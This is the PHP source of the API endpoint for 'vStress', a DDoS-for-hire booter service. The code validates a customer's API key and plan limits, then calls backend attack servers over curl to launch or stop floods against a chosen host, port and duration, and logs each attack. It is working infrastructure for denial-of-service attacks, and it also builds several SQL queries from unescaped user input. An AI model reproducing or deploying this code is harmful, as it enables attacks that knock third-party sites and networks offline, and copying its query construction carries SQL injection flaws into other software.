<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
 <link href="../assets/toastr/toastr.min.css" rel="stylesheet" type="text/css" />

        <title>vStress | API System v2.0</title>
		<meta name="Keywords" content="ip booter, ip stresser, stresser, booter, best ip stresser 2019">
      <meta name="description" content="Powerful IP Stress Testing Service!">


 
    </head>
	<body background="black">
	
<?php 

 
 require '../complex/configuration.php';
 require '../complex/init.php';
 $type = $_GET['type'];
 session_start();
 $type = $_GET['type'];
 
 
    if(isset($_GET['avalible']))
{
	echo '<strong style="color:red">List of methods: </strong><br><br>';
	$show = $odb->prepare("SELECT * FROM `methods`");
	$show -> execute();
	while ($methodsFetched = $show -> fetch(PDO::FETCH_ASSOC))
{
	echo ''.$methodsFetched["fullname"].'<br>';
}	
	die();
	 }
   if(isset($_GET['key']))
{
	if(!empty($_GET['key']))
	{
		// Store the key into a variable
		$key = $_GET['key'];
		
		// Fetch the user who owns the key specified
		$FetchUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `apikey` = ?");
		$FetchUserSQL -> execute(array($key));
		$FetchedUser = $FetchUserSQL -> fetch(PDO::FETCH_ASSOC);
		
		if($FetchedUser){        

                            

		$cooldowncheck2 = $odb->prepare("SELECT date FROM logs WHERE user = ? ORDER BY id DESC LIMIT 1");
        $cooldowncheck2->execute(array($_SESSION['username'])); 
        $checkcool = $cooldowncheck2->fetchColumn();
        $dtimer = time() - 30;
        $timeleft = $checkcool - $dtimer;
        $correct = gmdate("s", $timeleft);

        $cooldowncheck = $odb->prepare("SELECT COUNT(*) FROM logs WHERE user = ? AND date > ?");
        $cooldowncheck->execute(array($_SESSION['username'], time() - 30));
       
		
			$host   = $_GET['host'];		
			$port   = intval($_GET['port']);	
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$vip = intval($_GET['vip']);
			
			$totalservers = 1;
			
			$SQLGetu2 = $odb -> prepare("SELECT `username` FROM `users` WHERE `apikey` = :key");
					$SQLGetu2 -> execute(array(':key' => $key));
					$getUser = $SQLGetu2 -> fetchColumn(0);
			
if ($_GET['method'] == 'STOP') {
    $hostt     = $host;	
	$user      = $getUser;				
    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `user` = '$user' AND `ip` = '$hostt'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `user` = '$user' AND `ip` = '$hostt'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
    }
	$handlers = explode(",", $handler);
	foreach ($handlers as $handler)
	{
        $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time
            );
            $APILink      = $show['api'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $stopcommand  = "&method=STOP";
            $stopapi      = $APILink . $stopcommand;
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $stopapi);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
  
	}
    echo 'Attack <font class="text-danger">'.$host.'</font> Has Been Stopped!';
	die();
}

			$SQLGetApi = $odb -> prepare("SELECT `plans`.`api` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
					$SQLGetApi -> execute(array(':key' => $key));
					$haveapi = $SQLGetApi -> fetchColumn(0);
					$theapi = $haveapi;
					if(!($theapi == "0"))
				{
					// okay
				} else {
					echo '<strong>ERROR:</strong>You need Api access to use this!<br><strong style="color:red">vStress API System V2<br></strong>';
die();
					
				}
			
			if ($vip == "1") 
			{
				
				$SQLGetVip = $odb -> prepare("SELECT `plans`.`vip` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
					$SQLGetVip -> execute(array(':key' => $key));
					$havevip = $SQLGetVip -> fetchColumn(0);
					$thevip = $havevip;
					if(!($thevip == "0"))
				{
					// okay
				} else {
					echo '<strong>ERROR:</strong>You are not VIP to Use vip feature!<br><strong style="color:red">vStress API System V2<br></strong>';
die();
					
				}
			}
			
		$SQLGetHave = $odb -> prepare("SELECT `plans`.`ID` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
					$SQLGetHave -> execute(array(':key' => $key));
					$have = $SQLGetHave -> fetchColumn(0);
					$thehave = $have;
					
					$SQLGetHave2 = $odb -> prepare("SELECT `membership` FROM `users` WHERE `apikey` = :key");
					$SQLGetHave2 -> execute(array(':key' => $key));
					$have2 = $SQLGetHave2 -> fetchColumn(0);
					$thehave2 = $have2;
					if(!($thehave2 == $thehave))
			{
								echo '<strong>ERROR:</strong>You need plan to use this.<br><strong style="color:red">vStress API System V2<br></strong>';
die();
			
		}
		else {
			//continua bien
}
			if (empty($host) || empty($time) || empty($port) || empty($method) || empty($totalservers)) {
												echo '<strong>ERROR:</strong>Please verify all fields<br><strong style="color:red">vStress API System V2<br></strong>';
die();
				
			}

		

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);
			if ($type == 'layer7') {
				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
					die(error('Host is not a valid URL'));
				}


				$parameters = array(".gov", ".edu", "$", "{", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
																		echo '<strong>ERROR:</strong>You are not allowed to attack these websites<br><strong style="color:red">vStress API System V2<br></strong>';
die();

					}
				}

			} elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
            
            }
			
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);
			if ($countBlacklist > 0) {
																					echo '<strong>ERROR:</strong>Host is blacklisted<br><strong style="color:red">vStress API System V2<br></strong>';
die();
				
			}
			
		

		
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $getUser));
			$countRunning = $SQL -> fetchColumn(0);
			
			$SQLconc = $odb->prepare("SELECT `aconcu` FROM `users` WHERE `username` = :id");
        $SQLconc->execute(array(
            ":id" => $getUser
        ));
        $aconcu = $SQLconc->fetchColumn(0);
        $SQLconcu    = $odb->prepare("SELECT `plans`.`concurrents` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`username` = ?");
        $SQLconcu->execute(array(
            $getUser
        ));
		$totalc = $SQLconcu->fetchColumn(0);
       $totalconcu = $totalc + $aconcu;
		
			if ($countRunning >= $totalconcu ) {
		echo '<strong>ERROR:</strong>You have too many boots running.<br><strong style="color:red">vStress API System V2<br></strong>';
die();
				
			}
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `ip` = '$host' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array());
			$countRunningH = $SQL -> fetchColumn(0);
			
		

			//Check Planss xDD
		
			//Addons Servers
			$SQL = $odb->prepare("SELECT `aserv` FROM `users` WHERE `users`.`apikey` = :key");
			$SQL ->execute(array(':key' => $key));
			$aserv = $SQL -> fetchColumn(0);
		    //Fin Addons Servers
		
		$SQL = $odb->prepare("SELECT `plans`.`totalservers` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
		$SQL ->execute(array(':key' => $key));
		$maxservers = $SQL->fetchColumn(0)+$aserv;
		
		//Addons Time
			$SQL = $odb->prepare("SELECT `atime` FROM `users` WHERE `users`.`apikey` = :key");
			$SQL ->execute(array(':key' => $key));
			$atime = $SQL -> fetchColumn(0);
		//Fin Addons Time
			
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`apikey` = :key");
		$SQLGetTime->execute(array(':key' => $key));
		$maxTime = $SQLGetTime->fetchColumn(0)+$atime;

		if ($time > $maxTime){
					echo '<strong>ERROR:</strong>Your max boot time has been exceeded. <br><strong style="color:red">vStress API System V2<br></strong>';
die();
			
		}
		if ($totalservers > $maxservers){
			die(error("Your servers per attack has been exceeded $maxservers."));
		}
		if($time < 10){
								echo '<strong>ERROR:</strong>Your attack must be over 10 seconds long. <br><strong style="color:red">vStress API System V2<br></strong>';
die();
			
		}
        $i = 0;
		
		if ($vip == '1') { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method AND `status` = 1 ORDER BY ABS(`lastUsed`) ASC LIMIT $totalservers");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		}
		else { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method AND `status` = 1 ORDER BY ABS(`lastUsed`) ASC LIMIT $totalservers");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		}
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

			 $getServerName = $odb -> prepare("SELECT `name` FROM `servers` WHERE (`lastUsed` < UNIX_TIMESTAMP() AND `lastUsed` != 0) ORDER BY RAND() LIMIT 1");
             $getServerName -> execute();
             $serverName = $getServerName -> fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
            $arrayFind = array('[host]', '[port]', '[time]', '[method]');
            $arrayReplace = array($host, $port, $time, $method);
            $APILink = $show['api'];
			$handler[] = $show['name'];
			
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 2);
            curl_setopt($ch, CURLOPT_TIMEOUT, 17);
            $result = curl_exec($ch);
            curl_close($ch);

        }
		
		if (!$result) {
											echo '<strong>ERROR:</strong>error when connecting to the server if the problem still contacts an admin</div><br><strong style="color:red">vStress.io API System V2<br>By:Ȼøмᵽℓєχ</strong>';
die();
			
		}

        if ($i == 0) {
	echo '<strong>ERROR:</strong>No open slots for your attack<br><strong style="color:red">vStress API System V2<br></style>';
die();
            
        }

		$handlers     = @implode(",", $handler);

		$chart = date("d-m");
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), :chart, '0', :handler, :vip, :totalservers, '1')");
		$insertLogSQL -> execute(array(':user' => $getUser, ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method, ':chart' => $chart, ':handler' => $handlers, ':vip' => $vip, ':totalservers' => $totalservers));

		$updateServer = $odb -> prepare("UPDATE `api` SET `lastUsed` = UNIX_TIMESTAMP()+:time WHERE `name` = :name");
        $updateServer -> execute(array(':name' => $handlers, ':time' => $time));
		  
        $updateserverip = $odb -> prepare("UPDATE `api` SET `lastip` = ? WHERE `name` = ?");
        $updateserverip -> execute(array($host, $handlers));
if($vip == "1"){
	$vip = 'ViP';
}else{
	$vip = 'Normal';
}
		echo 'Attack sent to Host: '.$host.'<br> Port:'.$port.'<br> Time: '.$time.'<br> Network: '.$vip.'<br> TotalServers: '.$totalservers.' <br>with server:'.$handlers.'<br><strong style="color:red">vStress API System V2<br></strong>';

	
	
	}
		else
		{
			echo "\n\t<section id=\"main-content\">\n\t<section class=\"wrapper\">\n\t<div class=\"row\">\n\n\t<div class=\"alert alert-danger\"><style>\nbody \n{\n\tbackground-color: black;\n\tcolor:white;\n}\n.alert-danger\n{\n\tcolor:red;\n}\n.alert-success\n{\n\tcolor:lime;\n}\n</style><span style=\"color: red;\"><strong>Invalid key Specified</div>\n\t\t\n\t</div>\n\t</div>\n\t</div>\n\t\t";
		}
	}
	else
	{
		echo "\n\t<section id=\"main-content\">\n\t<section class=\"wrapper\">\n\t<div class=\"row\">\n\n\t<div class=\"alert alert-danger\"><style>\nbody \n{\n\tbackground-color: black;\n\tcolor:white;\n}\n.alert-danger\n{\n\tcolor:red;\n}\n.alert-success\n{\n\tcolor:lime;\n}\n</style><span style=\"color: red;\"><strong>No key Specified</div>\n\t\t\n\t</div>\n\t</div>\n\t</div>\n\t\t";
							
	}
}
else
{
echo "\n\t<section id=\"main-content\">\n\t<section class=\"wrapper\">\n\t<div class=\"row\">\n\n\t<div class=\"alert alert-danger\"><style>\nbody \n{\n\tbackground-color: black;\n\tcolor:white;\n}\n.alert-danger\n{\n\tcolor:red;\n}\n.alert-success\n{\n\tcolor:lime;\n}\n</style><span style=\"color: red;\"><strong>No key Specified</div>\n\t\t\n\t</div>\n\t</div>\n\t</div>\n\t\t";
}

?>

